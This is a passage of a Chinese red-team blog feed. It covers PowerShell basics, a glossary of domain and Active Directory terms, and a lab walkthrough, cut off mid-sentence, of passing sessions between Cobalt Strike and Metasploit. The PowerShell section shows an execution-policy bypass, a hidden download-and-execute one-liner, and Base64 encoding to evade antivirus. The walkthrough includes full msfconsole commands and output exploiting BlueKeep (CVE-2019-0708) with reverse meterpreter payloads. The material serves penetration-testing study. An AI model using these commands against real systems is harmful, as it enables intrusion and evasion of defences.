windows 10</p><p>5.1        windows server 2016</p><h2 id="2、基本概念"><a href="#2、基本概念" class="headerlink" title="2、基本概念"></a>2、基本概念</h2><h3 id="ps1-文件"><a href="#ps1-文件" class="headerlink" title="ps1 文件"></a>ps1 文件</h3><p>ps1 是PowerShell 的脚本扩展名，一个 PowerShell 脚本文件其实就是一个简单的文本文件。</p><h3 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h3><p>为了防止恶意脚本在 PowerShell 中被运行，PowerShell 有个执行策略，默认情况下，这个执行策略是受限模式<code>Restricted</code>。</p><p>使用 <code>Get-ExecutionPolicy</code>命令查看当前执行策略</p><pre><code>PS C:\Users\teamssix&gt; Get-ExecutionPolicyRestricted</code></pre><p>执行策略有以下几种：</p><p><strong>Restricted</strong>：不能运行脚本</p><p><strong>RemoteSigned</strong>：本地创建的脚本可以运行，但从网上下载的脚本不能运行（除非它们拥有由受信任的发布者签署的数字签名）</p><p><strong>AllSigned</strong>：仅当脚本由受信任的发布者签名才能运行。 </p><p><strong>Unrestricted</strong>：脚本执行不受限制，不管来自哪里，也不管它们是否有签名。</p><p>使用<code>Set-ExecutionPolicy &lt;policy name&gt;</code>设置执行策略，该命令需要管理员权限</p><pre><code>PS C:\WINDOWS\system32&gt; Set-ExecutionPolicy Unrestricted执行策略更改执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:/go.microsoft.com/fwlink/?LinkID=135170 中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略?[Y] 是(Y)  [A] 全是(A)  [N] 否(N)  [L] 全否(L)  [S] 暂停(S)  [?] 帮助 (默认值为“N”): APS C:\WINDOWS\system32&gt; Get-ExecutionPolicyUnrestricted</code></pre><h3 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h3><p>PowerShell 运行脚本的方式和其他 shell 基本一致，可以输入完整路径运行，也可以到 ps1 文件所在目录下去运行，具体如下：</p><pre><code>PS C:\Users\teamssix&gt; C:\t.ps1hello TeamsSixPS C:\Users\teamssix&gt; cd C:\PS C:\&gt; .\t.ps1hello TeamsSix</code></pre><blockquote><p>这里不禁想吐槽一下，在看百度百科的时候关于 PowerShell 运行脚本的描述是这样的：“假设你要运行一个名为a.ps1的脚本，你可以键入 C:\Scripts\aps1，最大的例外是，如果 PowerShell 脚本文件刚好位于你的系统目录中，那么你可以直接在命令提示符命令提示符后键入脚本文件名即可运行”</p><p>这里的“系统目录”是指的啥目录？C:\还是C:\windows\system目录，“最大的例外”又是什么鬼，讲道理读起来有一种机翻的感觉。</p></blockquote><h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>PowerShell 中的管道类似于 linux 中的管道，都是将前一个命令的输出作为另一个命令的输入，两个命令之间使用 “|” 进行连接。</p><p>例如，在 PowerShell 中获取进程信息并以程序 ID 进行排序</p><pre><code>PS C:\&gt; Get-Process | Sort-Object IDHandles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName-------  ------    -----      -----     ------     --  -- -----------      0       0       60          8                 0   0 Idle   3038       0      208       4760                 4   0 System      0      12     7732      81344                88   0 Registry     53       3     1160        752               368   0 smss    256      10     2468       7424               424   0 svchost    662      21     1788       4668               504   0 csrss    160      11     1364       5660               580   0 wininit    653      27    18592     177580               588   1 csrss   1219      67    59660         52       2.59    600   1 WinStore.App    278      14     3108      15656               684   1 winlogon    687      11     5420       9432               724   0 services</code></pre><h2 id="3、一些命令"><a href="#3、一些命令" class="headerlink" title="3、一些命令"></a>3、一些命令</h2><blockquote><p>-NoLogo：启动不显示版权标志的PowerShell</p><p>-WindowStyle Hidden (-W Hidden)：隐藏窗口</p><p>-NoProfile (-NoP)：不加载当前用户的配置文件</p><p>–Enc：执行 base64 编码后的 powershell 脚本字符串</p><p>-ExecutionPolicy Bypass (-Exec Bypass) ：绕过执行安全策略</p><p>-Noexit：执行后不退出Shell，这在使用键盘记录等脚本时非常重要</p><p>-NonInteractive (-Nonl)：非交互模式，PowerShell 不为用户提供交互的提示</p></blockquote><p>在 PowerShell 下，命令的命名规范很一致，都采用了动词-名词的形式，如 Net-Item，动词一般为 Add、New、Get、Remove、Set 等。PowerShell 还兼容 cmd 和 Linux 命令，如查看目录可以使用 dir 或者 ls 。</p><h3 id="文件操作类命令"><a href="#文件操作类命令" class="headerlink" title="文件操作类命令"></a>文件操作类命令</h3><pre><code>新建目录test：New-Item test -ItemType directory删除目录test：Remove-Item test新建文件test.txt：New-Item test.txt -ItemType file新建文件test.txt，内容为 hello：New-Item test.txt -ItemType file -value &quot;hello&quot;删除文件test.txt：Remove-Item test.txt查看文件test.txt内容：Get-Content  test.txt设置文件test.txt内容t：Set-Content  test.txt  -Value &quot;hello&quot;给文件test.txt追加内容：Add-Content test.txt  -Value &quot;,word!&quot;清除文件test.txt内容：Clear-Content test.txt</code></pre><h3 id="绕过本地权限并执行"><a href="#绕过本地权限并执行" class="headerlink" title="绕过本地权限并执行"></a>绕过本地权限并执行</h3><p>上面说到了默认情况下 PowerShell 的执行策略是受限模式<code>Restricted</code>，这就导致了在渗透测试过程中我们需要采用一些方法绕过这个策略，从而执行我们的脚本文件。</p><p>先来看看默认受限模式下执行脚本的情况</p><pre><code>PS C:\Users\teamssix&gt; powerShell.exe Get-ExecutionPolicyRestrictedPS C:\Users\teamssix&gt; PowerShell.exe -File t.ps1无法加载文件 C:\Users\teamssix\t.ps1，因为在此系统上禁止运行脚本。有关详细信息，请参阅 https:/go.microsoft.com/fwlink/?LinkID=135170 中的 about_Execution_Policies。    + CategoryInfo          : SecurityError: (:) []，ParentContainsErrorRecordException    + FullyQualifiedErrorId : UnauthorizedAccess</code></pre><p>这里系统会提示在此系统上禁止运行脚本，但加上 <code>-ExecutionPolicy Bypass</code>即可绕过这个限制</p><pre><code>PS C:\Users\teamssix&gt; cat .\t.ps1echo &quot;Hello TeamsSix&quot;PS C:\Users\teamssix&gt; PowerShell.exe -ExecutionPolicy Bypass -File t.ps1hello TeamsSix</code></pre><h3 id="绕过本地权限并隐藏执行"><a href="#绕过本地权限并隐藏执行" class="headerlink" title="绕过本地权限并隐藏执行"></a>绕过本地权限并隐藏执行</h3><p>加入<code>-WindowStyle Hidden -NoLogo -NonInteractive -NoProfile</code> 即可隐藏执行。</p><pre><code>PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -File t.ps1</code></pre><h3 id="下载远程脚本绕过权限并隐藏执行"><a href="#下载远程脚本绕过权限并隐藏执行" class="headerlink" title="下载远程脚本绕过权限并隐藏执行"></a>下载远程脚本绕过权限并隐藏执行</h3><pre><code>PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://172.16.214.1:8000/t.ps1&#39;)&quot;</code></pre><p>或者简写</p><pre><code>PowerShell.exe -Exec Bypass -W Hidden -NoLogo -NonI -NoP &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://172.16.214.1:8000/t.ps1&#39;)&quot;</code></pre><h3 id="利用-Base64-对命令进行编码"><a href="#利用-Base64-对命令进行编码" class="headerlink" title="利用 Base64 对命令进行编码"></a>利用 Base64 对命令进行编码</h3><p>使用 Base64 进行编码主要是为了混淆代码以避免被杀毒软件查杀，经过尝试这里直接使用 Base64 编码是不行的，可以使用 Github 上的一个编码工具，工具下载地址：</p><p><a href="https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py">https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py</a></p><p>下载好后，需要先将要执行的命令保存到文本文件中，这里保存到了 tmp.txt 文本中，之后执行 <code>python ps_encoder.py -s tmp.txt</code> 即可</p><pre><code>&gt;cat tmp.txtIEX(New-Object Net.WebClient).DownloadString(&#39;http://172.16.214.1:8000/t.ps1&#39;)&gt;python ps_encoder.py -s tmp.txtSQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMgAxADQALgAxADoAOAAwADAAMAAvAHQALgBwAHMAMQAnACkA</code></pre><p>使用 –Enc 指定 Base64 编码内容</p><pre><code>PowerShell.exe -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMgAxADQALgAxADoAOAAwADAAMAAvAHQALgBwAHMAMQAnACkA</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-02-06_18-40-25.png"></p><blockquote><p>参考链接：</p><p><a href="https://www.jianshu.com/p/c8f5c374466a">https://www.jianshu.com/p/c8f5c374466a</a></p><p><a href="https://www.cnblogs.com/frendguo/p/11761693.html">https://www.cnblogs.com/frendguo/p/11761693.html</a></p><p><a href="https://www.cnblogs.com/lavender000/p/6931405.html">https://www.cnblogs.com/lavender000/p/6931405.html</a></p><p><a href="https://www.cnblogs.com/coderge/articles/13768824.html">https://www.cnblogs.com/coderge/articles/13768824.html</a></p><p><a href="https://baike.baidu.com/item/Windows%20Power%20Shell">https://baike.baidu.com/item/Windows%20Power%20Shell</a></p><p><a href="https://blog.csdn.net/weixin_45116657/article/details/103449931">https://blog.csdn.net/weixin_45116657/article/details/103449931</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、介绍&quot;&gt;&lt;a href=&quot;#1、介绍&quot; class=&quot;headerlink&quot; title=&quot;1、介绍&quot;&gt;&lt;/a&gt;1、介绍&lt;/h2&gt;&lt;p&gt;PowerShell 可以简单的理解为 cmd 的高级版，cmd 能做的事在 PowerShell 中都能做，但 Power</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】1、内网中常见名词解释</title>
    <link href="https://www.teamssix.com/year/210203-192358.html"/>
    <id>https://www.teamssix.com/year/210203-192358.html</id>
    <published>2021-02-03T11:23:58.000Z</published>
    <updated>2021-02-03T09:33:33.820Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、工作组"><a href="#1、工作组" class="headerlink" title="1、工作组"></a>1、工作组</h2><p><strong>工作组</strong> <code>Work Group</code> 是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。</p><p>比如在一个网络内，可能有成百上千台工作电脑，如果这些电脑不进行分组，都列在“网上邻居”内，可想而知会有多么乱。</p><p>为了解决这一问题，Windows 9x/NT/2000 引用了“工作组”这个概念，比如一所高校，会分为诸如数学系、中文系之类的，然后数学系的电脑全都列入数学系的工作组中，中文系的电脑全部都列入到中文系的工作组中……如果你要访问某个系别的资源，就在“网上邻居”里找到那个系的工作组名，双击就可以看到那个系别的电脑了。</p><p>在工作组中所有的计算机都是平等的，没有管理与被管理之分，因此工作组网络也称为对等网络。</p><p>所以对于管理者而言，工作组的管理方式有时会不太便于管理，这时候就需要了解域的概念了。</p><h2 id="2、域"><a href="#2、域" class="headerlink" title="2、域"></a>2、域</h2><h3 id="域-Domain"><a href="#域-Domain" class="headerlink" title="域 Domain"></a>域 <code>Domain</code></h3><p> 可以简单的理解成工作组的升级版，如果说工作组是“免费旅店”那么域就是“星级宾馆”；工作组可以随便进进出出，而域则有严格的控制。</p><p>在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为域控制器。</p><h3 id="域控制器-Domain-Controller"><a href="#域控制器-Domain-Controller" class="headerlink" title="域控制器 Domain Controller"></a>域控制器 <code>Domain Controller</code></h3><p>简写为 <code>DC</code>，域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。</p><p>当电脑连入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确的，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，这样就在一定程度上保护了网络上的资源。</p><p>正是因为域控起到了一个身份验证的作用，因此站在渗透的角度来说，拿下域控是至关重要的。拿下了域控，就相当于拿到了整个域内所有计算机的账号和密码。</p><p>而要想实现域环境，就必须要计算机中安装活动目录，也可以说如果在内网中的一台计算机上安装了活动目录，那它就变成了域控制器。在域中除了域控制器还有成员服务器、客户机、独立服务器。</p><h3 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h3><p>顾名思义，在一个域下新建了一个域便称其为子域。形象的来说，一个部门一个域，那个如果这个部门还有分部，那每个分部就可被称为子域，这个大的部门便称为父域。每个域中都有独立的安全策略。</p><h3 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h3><p>域树由多个域组成，这些域共享同一表结构和配置，形成一个连续的名字空间。</p><p>树中的域通过信任关系连接起来，活动目录包含一个或多个域树。域树中的域层次越深级别越低，一个“.”代表一个层次，如域child.Microsoft.com 就比 Microsoft.com这个域级别低，因为它有两个层次关系，而Microsoft.com只有一个层次。</p><p>而域Grandchild.Child.Microsoft.com又比 Child.Microsoft.com级别低，道理一样。他们都属于同一个域树。Child.Microsoft.com就属于Microsoft.com的子域。</p><p>多个域树可以组成一个域林。</p><h3 id="域林"><a href="#域林" class="headerlink" title="域林"></a>域林</h3><p>域林是指由一个或多个没有形成连续名字空间的域树组成，它与域树最明显的区别就在于域林之间没有形成连续的名字空间，而域树则是由一些具有连续名字空间的域组成。</p><p>但域林中的所有域树仍共享同一个表结构、配置和全局目录。域林中的所有域树通过Kerberos 信任关系建立起来，所以每个域树都知道Kerberos信任关系，不同域树可以交叉引用其他域树中的对象。域林都有根域，域林的根域是域林中创建的第一个域，域林中所有域树的根域与域林的根域建立可传递的信任关系.</p><p>比如benet.com.cn,则可以创建同属与一个林的accp.com.cn,他们就在同一个域林里.</p><p>当创建第一个域控制器的时候，就创建了第一个域（也称林根域），和第一个林。</p><p>林，是一个或多个共享公共架构和全局编录的域组成，每个域都有单独的安全策略，和与其他域的信任关系。一个单位可以有多个林。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/%E5%9F%9F%E6%9E%97.png" alt="域林"></p><h2 id="3、活动目录"><a href="#3、活动目录" class="headerlink" title="3、活动目录"></a>3、活动目录</h2><p><strong>活动目录</strong> <code>Active Directory</code> ，简写为 <code>AD</code>，它是 Windows Server 中负责架构中大型网络环境的集中式目录管理服务，在Windows 2000 Server 开始内置于 Windows Server 产品中。</p><p>目录包含了有关各种对象，例如用户、用户组、计算机、域、组织单位（OU）以及安全策略的信息。目录存储在域控上，并且可以被网络应用程序或者服务所访问。</p><p>活动目录就相当于内网中各种资源的一个目录，通过活动目录用户可以快速定位到这些资源的位置。</p><h2 id="4、DMZ"><a href="#4、DMZ" class="headerlink" title="4、DMZ"></a>4、DMZ</h2><p>DMZ <code>demilitarized zone</code> ，中文名为“隔离区”，或称“非军事化区”。它是为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，从而设立的一个非安全系统与安全系统之间的缓冲区。</p><p>DMZ 区可以理解为一个不同于外网或内网的特殊网络区域，DMZ 内通常放置一些不含机密信息的公用服务器，比如 WEB 服务器、E-Mail 服务器、FTP 服务器等。这样来自外网的访问者只可以访问 DMZ 中的服务，但不可能接触到存放在内网中的信息等，即使 DMZ 中服务器受到破坏，也不会对内网中的信息造成影响。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/f603918fa0ec08fadb43804a59ee3d6d54fbda98.jfif"></p><h2 id="5、域内的各种权限"><a href="#5、域内的各种权限" class="headerlink" title="5、域内的各种权限"></a>5、域内的各种权限</h2><p>首先要理解一下组的概念，在组里包含了很多用户，当管理员想要给某个用户分配权限时，只需要将用户加入到对应权限的组里就行，从而提高了管理效率，常见的组有：域本地组、全局组、通用组。</p><p><strong>域本地组</strong></p><p>成员范围：所有的域；使用范围：自己所在的域</p><p><strong>全局组</strong></p><p>成员范围：自己所在的域；使用范围：所有的域</p><p><strong>通用组</strong></p><p>成员范围：所有的域；使用范围：所有的域</p><p><strong>A-G-DL-P 策略</strong></p><p>A-G-DL-P 策略是将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限。</p><ul><li>A 表示用户账号</li><li>G 表示全局组</li><li>U 表示通用组</li><li>DL 表示域本地组</li><li>P 表示资源权限</li></ul><blockquote><p>参考链接：</p><p><a href="https://baike.baidu.com/item/DMZ">https://baike.baidu.com/item/DMZ</a></p><p><a href="https://baike.baidu.com/item/AGDLP">https://baike.baidu.com/item/AGDLP</a></p><p><a href="https://zh.wikipedia.org/wiki/Active_Directory">https://zh.wikipedia.org/wiki/Active_Directory</a></p><p><a href="https://baike.baidu.com/item/Windows%E5%9F%9F">https://baike.baidu.com/item/Windows%E5%9F%9F</a></p><p><a href="https://baike.baidu.com/item/%E5%9F%9F%E6%A0%91">https://baike.baidu.com/item/%E5%9F%9F%E6%A0%91</a></p><p><a href="https://baike.baidu.com/item/%E5%9F%9F%E6%9E%97">https://baike.baidu.com/item/%E5%9F%9F%E6%9E%97</a></p><p><a href="https://baike.baidu.com/item/%E5%B7%A5%E4%BD%9C%E7%BB%84">https://baike.baidu.com/item/%E5%B7%A5%E4%BD%9C%E7%BB%84</a></p><p><a href="https://baike.baidu.com/item/%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95">https://baike.baidu.com/item/%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、工作组&quot;&gt;&lt;a href=&quot;#1、工作组&quot; class=&quot;headerlink&quot; title=&quot;1、工作组&quot;&gt;&lt;/a&gt;1、工作组&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;工作组&lt;/strong&gt; &lt;code&gt;Work Group&lt;/code&gt; 是最常见最简单最普通的资源</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【经验总结】CS与MSF之间的会话传递</title>
    <link href="https://www.teamssix.com/year/210129-191714.html"/>
    <id>https://www.teamssix.com/year/210129-191714.html</id>
    <published>2021-01-29T11:17:14.000Z</published>
    <updated>2021-01-29T07:33:21.636Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>众所周知，Cobalt Strike 的前身是 Armitage，而 Armitage 又可以理解为 Metasploit  Framework 的图形界面版，因此 Cobalt Strike 与 Metasploit  Framework 在很多地方都是兼容的，所以我们便可以将 Metasploit  Framework 攻击产生的会话传递到 Cobalt Strike 上，同样的 Cobalt Strike 的会话也能够传递到 Metasploit  Framework</p><p><strong>Metasploit  Framework 会话传递到 Cobalt Strike 上整体过程如下：</strong></p><p>1、Metasploit Framework 调用攻击载荷，这里调用的是喜闻乐见的 CVE-2019-0708</p><p>2、Metasploit Framework 发起攻击，获取会话</p><p>3、Cobalt Strike 新建一个 Beacon，这里使用的是 HTTPS Beacon</p><p>4、最后，在 Metasploit Framework 上调用 exploit/windows/local/payload_inject 模块</p><p>5、在该模块上配置与 Cobalt Strike 上为同样类型的 payload，即 HTTPS Payload，设置 Cobalt Strike 服务器的 IP 和 端口后运行即可</p><p><strong>Cobalt Strike 会话传递到 Metasploit  Framework 上整体过程如下：</strong></p><p>1、首先，Cobalt Strike 需要获得一个会话，这里直接采用 Scripted Web Delivery（S）的方式使靶机上线</p><p>2、接着，Metasploit Framework 调用 exploit/multi/handler 模块</p><p>3、在该模块上配置 HTTP Payload，为该 payload 的 IP 和 端口设置成 Metasploit Framework 所在主机 IP，端口自定义即可</p><p>4、 之后运行该模块</p><p>5、在 Cobalt Strike 上创建一个 Foreign HTTP 的监听，监听 IP 和端口设置成刚才 Metasploit Framework 上所监听的 IP 和端口</p><p>7、接着在 Cobalt Strike 上右击选择要传递的会话，找到 Spawn 选项，选择刚刚创建的监听器即可</p><blockquote><p>环境信息：</p><p>攻击 IP：192.168.175.200 （Cobalt Strike 服务端、Metasploit Framework 所在主机）</p><p>靶机 IP：192.168.175.177 （一台有 CVE-2019-0708 漏洞的 Win7 SP1 64 位靶机）</p></blockquote><h1 id="0x01-Metasploit-Framework-会话传递到-Cobalt-Strike"><a href="#0x01-Metasploit-Framework-会话传递到-Cobalt-Strike" class="headerlink" title="0x01 Metasploit Framework 会话传递到 Cobalt Strike"></a>0x01 Metasploit Framework 会话传递到 Cobalt Strike</h1><h2 id="1、Cobalt-Strike-上的操作"><a href="#1、Cobalt-Strike-上的操作" class="headerlink" title="1、Cobalt Strike 上的操作"></a>1、Cobalt Strike 上的操作</h2><p>首先来到 Cobalt Strike 目录下，启动 Cobalt Strike 服务端</p><pre><code>./teamserver yourip yourpassword</code></pre><p>之后打开 Cobalt Strike 客户端进行连接</p><pre><code>./start.sh</code></pre><p>输入服务端密码连接上之后，点击 Cobalt Strike –&gt; Listeners 打开 Listeners 界面，点击下方的 Add 按钮，输入 Beacon 名称，这里选择的是 HTTPS Beacon，添加上主机 IP，点击保存，即可创建一个 HTTPS Beacon</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-24_20-07-57.png"></p><h2 id="2、Metasploit-Framework-上的操作"><a href="#2、Metasploit-Framework-上的操作" class="headerlink" title="2、Metasploit Framework 上的操作"></a>2、Metasploit Framework 上的操作</h2><p>首先，打开 Metasploit Framework</p><pre><code>msfconsole </code></pre><p>调用 CVE-2019-0708 模块</p><pre><code>use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</code></pre><p>设置靶机 IP</p><pre><code>set rhost 192.168.175.177</code></pre><p>设置 Payload</p><pre><code>set payload windows/x64/meterpreter/reverse_tcpset lhost 192.168.175.200</code></pre><p>发起攻击</p><pre><code>exploit</code></pre><p>整体过程如下：</p><pre><code>root@kali:~# msfconsolemsf5 &gt; use exploit/windows/rdp/cve_2019_0708_bluekeep_rcemsf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set rhost 192.168.175.177rhost =&gt; 192.168.175.177msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set payload windows/x64/meterpreter/reverse_tcppayload =&gt; windows/x64/meterpreter/reverse_tcpmsf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set lhost 192.168.175.200lhost =&gt; 192.168.175.200msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; exploit[*] Started reverse TCP handler on 192.168.175.200:4444 [*] 192.168.175.177:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check[+] 192.168.175.177:3389  - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.[*] 192.168.175.177:3389  - Scanned 1 of 1 hosts (100% complete)[*] 192.168.175.177:3389 - Using CHUNK grooming strategy. Size 250MB, target address 0xfffffa8028608000, Channel count 1.[!] 192.168.175.177:3389 - &lt;---------------- | Entering Danger Zone | ----------------&gt;[*] 192.168.175.177:3389 - Surfing channels ...[*] 192.168.175.177:3389 - Lobbing eggs ...[*] 192.168.175.177:3389 - Forcing the USE of FREE&#39;d object ...[!] 192.168.175.177:3389 - &lt;---------------- | Leaving Danger Zone | ----------------&gt;[*] Sending stage (206403 bytes) to 192.168.175.177[*] Meterpreter session 4 opened (192.168.175.200:4444 -&gt; 192.168.175.177:49167) at 2020-07-26 05:57:22 -0400meterpreter &gt; </code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_17-57-47.png"></p><h2 id="3、开始传递会话"><a href="#3、开始传递会话" class="headerlink" title="3、开始传递会话"></a>3、开始传递会话</h2><p>首先，backgroud 会话</p><pre><code>background</code></pre><p>调用 payload_inject 模块</p><pre><code>use exploit/windows/local/payload_inject</code></pre><p>设置 HTTPS Payload</p><pre><code>set payload windows/meterpreter/reverse_https</code></pre><p>设置 lhost 和 lport 为 Cobalt Strike 的监听 IP 与端口</p><pre><code>set lhost 192.168.175.200set lport 443</code></pre><p>设置 DisablePayloadHandler 为 True，此选项会让 Metasploit Framework 避免在其内起一个 handler 来服务你的 payload 连接，也就是告诉 Metasploit Framework 说我们已经建立了监听器，不必再新建监听器了。</p><pre><code>set DisablePayloadHandler True</code></pre><p>（可选）设置 PrependMigrate 为 True，此选项让 Metasploit Framework 前置 shellcode 在另一个进程中运行 payload stager，如果被利用的应用程序崩溃或被用户关闭，这会帮助 Beacon 会话存活。</p><pre><code>set PrependMigrate True</code></pre><p>设置要传递的会话 session，如果不知道自己的 session id，可以通过 sessions -l 查看，我这里待传递的 session id 为 4</p><pre><code> set session 4</code></pre><p>开始会话传递</p><pre><code>run</code></pre><p>整体过程如下：</p><pre><code>msf5 &gt; background [*] Backgrounding session 4...msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; use exploit/windows/local/payload_injectmsf5 exploit(windows/local/payload_inject) &gt; set payload windows/meterpreter/reverse_httpspayload =&gt; windows/meterpreter/reverse_httpsmsf5 exploit(windows/local/payload_inject) &gt; set lhost 192.168.175.200lhost =&gt; 192.168.175.200msf5 exploit(windows/local/payload_inject) &gt; set lport 443lport =&gt; 443msf5 exploit(windows/local/payload_inject) &gt; set DisablePayloadHandler TrueDisablePayloadHandler =&gt; truemsf5 exploit(windows/local/payload_inject) &gt; set PrependMigrate TruePrependMigrate =&gt; Truemsf5 exploit(windows/local/payload_inject) &gt;  set session 4session =&gt; 4msf5 exploit(windows/local/payload_inject) &gt; run[*] Running module against WIN-T0UES7KBMJ5[*] Spawned Notepad process 544[*] Injecting payload into 544[*] Preparing &#39;windows/meterpreter/reverse_https&#39; for PID 544</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_19-11-30.png"></p><p>此时，来到 Cobalt Strike 下已经可以看到传递过来的会话了</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-08-39.png"></p><h1 id="0x02-Cobalt-Strike-会话传递到-Metasploit-Framework"><a href="#0x02-Cobalt-Strike-会话传递到-Metasploit-Framework" class="headerlink" title="0x02 Cobalt Strike 会话传递到 Metasploit Framework"></a>0x02 Cobalt Strike 会话传递到 Metasploit Framework</h1><h2 id="1、Cobalt-Strike-上的操作-1"><a href="#1、Cobalt-Strike-上的操作-1" class="headerlink" title="1、Cobalt Strike 上的操作"></a>1、Cobalt Strike 上的操作</h2><p>与上述 Cobalt Strike 的操作步骤一样，这里先创建一个 HTTPS Beacon，接下来创建一个 Powershell 类型的 Scripted Web Delivery（S）</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-27-02.png">为了使 Cobalt Strike 获得一个会话，需要复制创建好的命令，并在靶机上运行，此时靶机便会上线了</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-30-31.png"></p><h2 id="2、Metasploit-Framework-上的操作-1"><a href="#2、Metasploit-Framework-上的操作-1" class="headerlink" title="2、Metasploit Framework 上的操作"></a>2、Metasploit Framework 上的操作</h2><p>首先，在 Metasploit Framework 上调用 handler 模块</p><pre><code>use exploit/multi/handler</code></pre><p>设置 HTTP Payload</p><pre><code>set payload windows/meterpreter/reverse_httpset lhost 192.168.175.200set lport 4480</code></pre><p>运行该模块</p><pre><code>run</code></pre><p>整体过程如下：</p><pre><code>msf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_httppayload =&gt; windows/meterpreter/reverse_httpmsf5 exploit(multi/handler) &gt; set lhost 192.168.175.200lhost =&gt; 192.168.175.200msf5 exploit(multi/handler) &gt; set lport 4480lport =&gt; 4480msf5 exploit(multi/handler) &gt; run[*] Started HTTPS reverse handler on http://192.168.175.200:4480</code></pre><h2 id="3、开始会话传递"><a href="#3、开始会话传递" class="headerlink" title="3、开始会话传递"></a><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-35-45.png">3、开始会话传递</h2><p>在 Cobalt Strike 上先创建一个  Foreign HTTP 监听，IP 和 端口设置成上面 